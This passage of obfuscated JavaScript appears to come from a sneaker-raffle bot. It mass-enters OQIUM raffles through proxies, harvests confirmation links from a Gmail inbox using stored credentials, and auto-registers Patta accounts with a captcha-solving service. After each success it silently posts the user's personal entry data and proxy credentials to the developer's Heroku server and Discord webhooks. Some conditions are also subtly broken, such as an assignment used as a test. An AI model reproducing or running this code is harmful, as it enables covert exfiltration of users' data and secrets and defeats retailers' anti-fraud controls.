                                                await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x2d74b2['succesDEVMSG']), await _0x63aa6a(0xc8);
                                                try {
                                                    await _0x56185b(_0x595b38, _0x2d74b2['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1ab0d7(_0x26aa80[_0x469035], _0x27bf03);
                                            }
                                            _0x553c88(console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x27bf03['name'] + ']\x20Task\x20' + (_0x469035 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x36e37a != 'ver') {
                                                var _0x1cff7c = '' + _0x55183e, _0x5dbec9 = await _0x198507(_0x26aa80[_0x469035], _0x27bf03, 'dev', !![], _0x1cff7c), _0x535452 = {};
                                                _0x535452['errorDEV'] = { 'embeds': [_0x5dbec9] }, _0x11ea8b(_0x26aa80[_0x469035], _0x27bf03), _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x535452['errorDEV']), await _0x56185b(_0x3c02fa, _0x535452['errorDEV']);
                                            }
                                            _0x1d8df4(console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x27bf03['name'] + ']\x20Task\x20' + (_0x469035 + 0x1) + ':\x20' + _0x55183e)));
                                        }
                                    };
                                    try {
                                        _0x36e37a != 'ver' ? console['log'](_0x2bc944() + '\x20[' + _0x27bf03['name'] + ']\x20Task\x20' + (_0x469035 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x4f6814['data']['attributes']['email']) : console['log'](_0x2bc944() + '\x20[' + _0x27bf03['name'] + ']\x20Task\x20' + (_0x469035 + 0x1) + ':\x20Fetching\x20Response'), _0xd1570a(_0x31290d, callback);
                                    } catch (_0x3541b0) {
                                        console['log'](_0x2bc944() + '\x20Task\x20' + (_0x469035 + 0x1) + ':\x20' + _0x3541b0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x31c5bb(_0x33a336, 'ver', _0x3e3389, _0x202927, _0x5a850), console['log'](_0x2bc944() + '\x20[' + _0x3e3389['name'] + ']\x20Sleeping\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                            } catch (_0x36abdb) {
                            }
                        }
                    }
                    try {
                        _0x41022f();
                        while (!_0xd7c54a) {
                            await _0x63aa6a(0xbb8);
                        }
                        console['log']('Found\x20' + _0x56c319['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x63aa6a(0x9c4);
                    }
                    await _0xc39fd8(_0x2c7efe, _0x56c319, _0x5d3284);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'U6yui3',
                            'custom_source': 'DV1748-601',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'SFX8xn',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x2fc8ac, _0x5ab63b, _0x1b17fa) {
                    var _0x1ed8da = _0x5ab63b, _0x33f485 = 0x0;
                    for (var _0x2daf07 = 0x0; _0x2daf07 < _0x5ab63b['length']; _0x2daf07++) {
                        maxTasks = _0x2ab3b9['threads'];
                        while (_0x33f485 >= maxTasks) {
                            await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                        async function _0x134e0f(_0x2f53c7, _0x2265cd, _0x428609, _0x47d13d) {
                            try {
                                await _0x5921e0(_0x2265cd, _0x47d13d);
                            } catch (_0x3869ee) {
                                throw new Error(_0x3869ee);
                            }
                            async function _0x1eb9e6(_0x1e0e35, _0x1f967a, _0x1e0407, _0x2c7fa3, _0x1697ec) {
                                _0x33f485++;
                                var _0x1841e2, _0x258725 = {}, _0x59967f = [], _0x4a2c16 = {}, _0x2cca0a = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x2e74d1 = Math['round'](Math['random']() * (_0x2cca0a['length'] - 0x1));
                                !_0x2c7fa3 && (_0x2c7fa3 = {});
                                if (_0x1f967a != 'ver') {
                                    _0x9474bc(_0x1e0407['name'] + '\x20Task\x20' + (_0x1e0e35 + 0x1) + '\x20/\x20' + _0x2c7fa3['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376), _0x59967f = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x484f45
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x2c7fa3[_0x1e0e35]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x2ab3b9['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0xb0ce0a
                                            }
                                        ]
                                    }], _0x4a2c16 = { 'embeds': _0x59967f }, _0x258725 = _0x1e0407['data'], _0x258725['data']['attributes']['email'] = '' + _0x2c7fa3[_0x1e0e35]['Email'];
                                    if (_0x2c7fa3[_0x1e0e35]['Size'] == 'RANDOM') {
                                    }
                                    _0x258725['data']['attributes']['properties']['$first_name'] = '' + _0x2c7fa3[_0x1e0e35]['FirstName'], _0x258725['data']['attributes']['properties']['$last_name'] = '' + _0x2c7fa3[_0x1e0e35]['LastName'], _0x258725['data']['attributes']['properties']['$address1'] = _0x2c7fa3[_0x1e0e35]['Address1'] + '\x20' + _0x2c7fa3[_0x1e0e35]['Address2'] + '\x20' + _0x2c7fa3[_0x1e0e35]['HouseNumber'], _0x258725['data']['attributes']['properties']['$zip'] = '' + _0x2c7fa3[_0x1e0e35]['Zip'], _0x258725['data']['attributes']['properties']['$city'] = '' + _0x2c7fa3[_0x1e0e35]['City'], _0x258725['data']['attributes']['properties']['$country'] = '' + _0x2c7fa3[_0x1e0e35]['Country'], _0x2c7fa3[_0x1e0e35]['Size'] == 'RANDOM' ? _0x258725['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2cca0a[_0x2e74d1] : _0x258725['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x2c7fa3[_0x1e0e35]['Size'], _0x258725['data']['attributes']['properties']['$phone_number'] = '' + _0x2c7fa3[_0x1e0e35]['Phone'], _0x258725['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x2c7fa3[_0x1e0e35]['Follower'];
                                }
                                if (_0x2ab3b9['useRandomProxy'] = ![])
                                    var _0x1b4d8f = _0x1697ec[_0x1e0e35]['split'](':');
                                else
                                    var _0x3111f0 = Math['round'](Math['random']() * (_0x1697ec['length'] - 0x1)), _0x1b4d8f = _0x1697ec[_0x3111f0]['split'](':');
                                var _0x4fb97f = {
                                    'jar': _0x40bca5,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1e0407['url'],
                                    'headers': _0x1e0407['headers'],
                                    'body': JSON['stringify'](_0x258725),
                                    'proxy': 'http://' + _0x1b4d8f[0x2] + ':' + _0x1b4d8f[0x3] + '@' + _0x1b4d8f[0x0] + ':' + _0x1b4d8f[0x1]
                                };
                                return _0x1f967a != 'ver' && (_0x4fb97f['url'] = _0x1e0407['url'], _0x4fb97f['headers'] = _0x1e0407['headers']), _0x1f967a == 'ver' && (_0x4fb97f['method'] = 'GET'), new Promise(function (_0x3b8f42, _0xf7de6) {
                                    callback = async (_0x2bc905, _0x241caf, _0x164627) => {
                                        if (!_0x2bc905 && _0x241caf['statusCode'] == 0xca || !_0x2bc905 && _0x241caf['statusCode'] == 0xc8) {
                                            if (_0x1f967a != 'ver') {
                                                var _0x488b29 = await _0x198507(_0x2c7fa3[_0x1e0e35], _0x1e0407, 'dev', ![]), _0x428764 = await _0x198507(_0x2c7fa3[_0x1e0e35], _0x1e0407, 'pub', ![]);
                                                const _0x20e1e3 = {
                                                    'succesDEVMSG': { 'embeds': [_0x488b29] },
                                                    'succesPUBMSG': { 'embeds': [_0x428764] }
                                                };
                                                let _0x474717 = _0x2c7fa3[_0x1e0e35];
                                                try {
                                                    prxdata = {
                                                        'username': _0x484f45['replace']('#', ''),
                                                        'module': _0x1e0407['name'],
                                                        'entrydata': JSON['stringify'](_0x474717),
                                                        'proxy': '' + _0x1697ec[_0x1e0e35]
                                                    };
                                                    var _0x302267 = JSON['stringify'](prxdata);
                                                    let _0x274ef1 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x302267, _0x274ef1);
                                                } catch (_0x5dc1d4) {
                                                }
                                                if (_0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '')
                                                    try {
                                                        await _0x56185b(_0x2ab3b9['webhook'], _0x20e1e3['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x20e1e3['succesDEVMSG']), await _0x63aa6a(0xc8);
                                                try {
                                                    await _0x56185b(_0x595b38, _0x20e1e3['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x1ab0d7(_0x2c7fa3[_0x1e0e35], _0x1e0407);
                                            }
                                            _0x33f485--, _0x3b8f42(console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x1e0407['name'] + ']\x20Task\x20' + (_0x1e0e35 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x1f967a != 'ver') {
                                                var _0x36a54c = '' + _0x2bc905, _0x3f59f0 = await _0x198507(_0x2c7fa3[_0x1e0e35], _0x1e0407, 'dev', !![], _0x36a54c), _0x5fdda0 = {};
                                                _0x5fdda0['errorDEV'] = { 'embeds': [_0x3f59f0] }, _0x11ea8b(_0x2c7fa3[_0x1e0e35], _0x1e0407), _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x5fdda0['errorDEV']), await _0x56185b(_0x3c02fa, _0x5fdda0['errorDEV']);
                                            }
                                            _0x33f485--, _0xf7de6(console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x1e0407['name'] + ']\x20Task\x20' + (_0x1e0e35 + 0x1) + ':\x20' + _0x2bc905)));
                                        }
                                    };
                                    try {
                                        _0x1f967a != 'ver' && console['log'](_0x2bc944() + '\x20[' + _0x1e0407['name'] + ']\x20Task\x20' + (_0x1e0e35 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x258725['data']['attributes']['email']), _0xd1570a(_0x4fb97f, callback);
                                    } catch (_0xa145ad) {
                                        console['log'](_0x2bc944() + '\x20Task\x20' + (_0x1e0e35 + 0x1) + ':\x20' + _0xa145ad);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x1eb9e6(_0x47d13d, 'nor', _0x2f53c7, _0x2265cd, _0x428609), console['log'](_0x2bc944() + '\x20[' + _0x2f53c7['name'] + ']\x20Sleeping\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                            } catch (_0x259e5d) {
                            }
                        }
                        _0x134e0f(_0x2fc8ac, _0x1ed8da, _0x1b17fa, _0x2daf07), await _0x63aa6a(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x568817, _0x2b4275, _0x570978) {
                    var _0x2b4275 = [], _0x39b034 = ![];
                    async function _0x195d37() {
                        var _0x55f4f5 = new _0x117139({
                            'user': _0x2ab3b9['masterMail'],
                            'password': _0x2ab3b9['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x400628(_0x10a102) {
                            _0x55f4f5['openBox']('INBOX', ![], _0x10a102);
                        }
                        _0x55f4f5['once']('ready', function () {
                            _0x400628(function (_0x46cc32, _0x47bf6b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x46cc32)
                                    throw _0x46cc32;
                                _0x55f4f5['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x51effc, _0x33ab6a) {
                                    if (!_0x33ab6a || !_0x33ab6a['length'])
                                        console['log'](_0x2bc944() + '\x20[' + _0x568817['name'] + ']\x20No\x20mails\x20found'), _0x55f4f5['end']();
                                    else {
                                        var _0x429ba5 = _0x55f4f5['seq']['fetch'](_0x33ab6a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x429ba5['on']('message', function (_0x347591, _0x53ace8) {
                                            var _0x299295 = '(#' + _0x53ace8 + ')\x20';
                                            _0x347591['on']('body', function (_0x1bb08f, _0x4ef0de) {
                                                _0x414931(_0x1bb08f, (_0x2f59b7, _0x36d63d) => {
                                                    var _0x28cc92 = _0x36d63d['text']['split']('(')[0x1], _0xc82421 = _0x28cc92['split'](')')[0x0];
                                                    _0x2b4275['push'](_0xc82421);
                                                });
                                            }), _0x347591['once']('end', function () {
                                            });
                                        }), _0x429ba5['once']('error', function (_0x241af6) {
                                            console['log']('Fetch\x20error:\x20' + _0x241af6), _0x39b034 = !![];
                                        }), _0x429ba5['once']('end', function () {
                                            _0x55f4f5['end'](), _0x39b034 = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x55f4f5['once']('error', function (_0x45d64d) {
                            console['log'](_0x45d64d), _0x39b034 = !![];
                        }), _0x55f4f5['once']('end', async function () {
                            _0x39b034 = !![];
                        }), _0x55f4f5['connect']();
                    }
                    async function _0x4904d5(_0x4be4d8, _0xd66819, _0x3d5022) {
                        for (var _0xb2160b = 0x0; _0xb2160b < _0xd66819['length']; _0xb2160b++) {
                            async function _0x41022d(_0x3dd3b2, _0x4ff1a4, _0x69d3c7, _0x135b4d, _0x55a00d) {
                                var _0x13e2f8, _0x356c7a = {}, _0x14a969 = [], _0x33752b = {}, _0x181b4e = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x59ba8f = Math['round'](Math['random']() * (_0x181b4e['length'] - 0x1));
                                _0x135b4d[_0x3dd3b2]['Size'] == 'RANDOM' && (_0x135b4d[_0x3dd3b2]['Size'] = _0x181b4e[_0x59ba8f]);
                                !_0x135b4d && (_0x135b4d = {});
                                if (_0x2ab3b9['useRandomProxy'] = ![])
                                    var _0x4642b6 = _0x55a00d[_0x3dd3b2]['split'](':');
                                else
                                    var _0x445fe7 = Math['round'](Math['random']() * (_0x55a00d['length'] - 0x1)), _0x4642b6 = _0x55a00d[_0x445fe7]['split'](':');
                                var _0x2908b8 = {
                                    'jar': _0x40bca5,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x69d3c7['url'],
                                    'headers': _0x69d3c7['headers'],
                                    'body': JSON['stringify'](_0x356c7a),
                                    'proxy': 'http://' + _0x4642b6[0x2] + ':' + _0x4642b6[0x3] + '@' + _0x4642b6[0x0] + ':' + _0x4642b6[0x1]
                                };
                                return _0x4ff1a4 == 'ver' && (_0x2908b8['method'] = 'GET', _0x2908b8['url'] = _0x135b4d[_0x3dd3b2]), new Promise(function (_0x4e68ac, _0x2a5e0d) {
                                    callback = async (_0x26efdf, _0x59c272, _0x34d0a8) => {
                                        !_0x26efdf && _0x59c272['statusCode'] == 0xca || !_0x26efdf && _0x59c272['statusCode'] == 0xc8 ? _0x4e68ac(console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x69d3c7['name'] + ']\x20Task\x20' + (_0x3dd3b2 + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x2a5e0d(console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x69d3c7['name'] + ']\x20Task\x20' + (_0x3dd3b2 + 0x1) + ':\x20' + _0x26efdf)));
                                    };
                                    try {
                                        _0x4ff1a4 != 'ver' ? console['log'](_0x2bc944() + '\x20[' + _0x69d3c7['name'] + ']\x20Task\x20' + (_0x3dd3b2 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x356c7a['data']['attributes']['email']) : console['log'](_0x2bc944() + '\x20[' + _0x69d3c7['name'] + ']\x20Task\x20' + (_0x3dd3b2 + 0x1) + ':\x20Fetching\x20Response'), _0xd1570a(_0x2908b8, callback);
                                    } catch (_0x2b4778) {
                                        console['log'](_0x2bc944() + '\x20Task\x20' + (_0x3dd3b2 + 0x1) + ':\x20' + _0x2b4778);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x41022d(_0xb2160b, 'ver', _0x4be4d8, _0xd66819, _0x3d5022), console['log'](_0x2bc944() + '\x20[' + _0x4be4d8['name'] + ']\x20Sleeping\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                            } catch (_0x298cd9) {
                                console['log'](_0x298cd9), await _0x63aa6a(0x2710);
                            }
                        }
                    }
                    try {
                        _0x195d37();
                        while (!_0x39b034) {
                            await _0x63aa6a(0xfa0);
                        }
                        console['log']('Found\x20' + _0x2b4275['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x36138d) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x36138d), await _0x63aa6a(0x2710);
                    }
                    try {
                        await _0x4904d5(_0x568817, _0x2b4275, _0x570978);
                    } catch (_0x18c4ea) {
                        console['log'](_0x18c4ea), await _0x63aa6a(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x234c4d, _0x17c278, _0x45987a) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1e3684 = 0x0; _0x1e3684 < _0x17c278['length']; _0x1e3684++) {
                        var _0x498e3c = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x484f45
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2ab3b9['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xb0ce0a
                                }
                            ]
                        }];
                        const _0x3567b7 = { 'embeds': _0x498e3c };
                        _0x9474bc(_0x234c4d['name'] + '\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20/\x20' + _0x17c278['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        try {
                            await _0x5921e0(_0x17c278, _0x1e3684);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x3eceb4 = await _0x198507(_0x17c278[_0x1e3684], _0x234c4d, 'acc', ![]);
                        const _0x524bea = { 'succesDEVMSG': { 'embeds': [_0x3eceb4] } };
                        if (_0x17c278[_0x1e3684]['Email'] == '' || _0x17c278[_0x1e3684]['FirstName'] == '' || _0x17c278[_0x1e3684]['LastName'] == '') {
                            console['log'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x63aa6a(0x7d0);
                            continue;
                        }
                        (_0x17c278[_0x1e3684]['Password'] == '' || _0x17c278[_0x1e3684] == undefined) && _0x17c278[_0x1e3684]['Password'] == 'JRaffles23!';
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x11c6da = _0x45987a[_0x1e3684]['split'](':');
                        else
                            var _0x374666 = Math['round'](Math['random']() * (_0x45987a['length'] - 0x1)), _0x11c6da = _0x45987a[_0x374666]['split'](':');
                        var _0x4503cb;
                        try {
                            _0x4503cb = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11c6da[0x0] + ':' + _0x11c6da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4503cb = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11c6da[0x0] + ':' + _0x11c6da[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5df1da = await _0x4503cb['newPage']();
                            await _0x5df1da['authenticate']({
                                'username': '' + _0x11c6da[0x2],
                                'password': '' + _0x11c6da[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x234c4d['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5df1da['setRequestInterception'](!![]), _0x5df1da['on']('request', _0x230c43 => {
                                _0x230c43['resourceType']() === 'image' || _0x230c43['resourceType']() === 'font' || _0x230c43['resourceType']() === 'media' ? _0x230c43['abort']() : _0x230c43['continue']();
                            }), await _0x5df1da['goto']('https://patta.nl/account/register'), await _0x63aa6a(0xbb8), await _0x5df1da['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x2bc944() + '\x20[' + _0x234c4d['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20Filling\x20information'), await _0x5df1da['type']('#RegisterForm-FirstName', '' + _0x17c278[_0x1e3684]['FirstName']), await _0x63aa6a(0x226), await _0x5df1da['type']('#RegisterForm-LastName', '' + _0x17c278[_0x1e3684]['LastName']), await _0x63aa6a(0x226), await _0x5df1da['type']('#RegisterForm-email', '' + _0x17c278[_0x1e3684]['Email']), await _0x63aa6a(0x226), await _0x5df1da['type']('#RegisterForm-password', '' + _0x17c278[_0x1e3684]['Password']), await _0x63aa6a(0x226), console['log'](_0x2bc944() + '\x20[' + _0x234c4d['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20Submitting..'), await _0x5df1da['$eval']('#RegisterForm', _0x22d9a6 => _0x22d9a6['submit']()), await _0x63aa6a(0x1f40);
                            try {
                                await _0x5df1da['waitForSelector']('.home-page-grid__collection'), await _0x63aa6a(0x1f4), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x234c4d['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20Account\x20' + _0x17c278[_0x1e3684]['Email'] + '\x20Generated!')), _0x25647b['appendFileSync']('../accounts/patta.csv', '\x0a' + _0x17c278[_0x1e3684]['Email'] + ',' + _0x17c278[_0x1e3684]['Password']), console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x234c4d['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20Account\x20' + _0x17c278[_0x1e3684]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x524bea['succesDEVMSG']);
                                } catch {
                                }
                                await _0x56185b(_0x46e741, _0x524bea['succesDEVMSG']);
                            } catch (_0x485b6a) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x485b6a));
                            }
                        } catch (_0x4579cd) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x1e3684 + 0x1) + '\x20:\x20' + _0x4579cd));
                        } finally {
                            _0x4503cb && _0x4503cb['close'](), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x53a347, _0xce107b, _0x15e24e) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x5050d1 = 0x0; _0x5050d1 < _0xce107b['length']; _0x5050d1++) {
                        var _0x1afb4f;
                        if (_0x12a229 != 'yes')
                            var _0x12a229 = '', _0x254261 = 0x0;
                        _0x9474bc(_0x53a347['name'] + '\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20/\x20' + _0xce107b['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        try {
                            await _0x5921e0(_0xce107b, _0x5050d1);
                        } catch {
                            _0x12a229 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0xce107b[_0x5050d1]['Email'] == '' || _0xce107b[_0x5050d1]['Password'] == '' || _0xce107b[_0x5050d1]['FirstName'] == '' || _0xce107b[_0x5050d1]['LastName'] == '') {
                            console['log'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x570d14 = _0x15e24e[_0x5050d1]['split'](':');
                        else
                            var _0x2349af = Math['round'](Math['random']() * (_0x15e24e['length'] - 0x1)), _0x570d14 = _0x15e24e[_0x2349af]['split'](':');
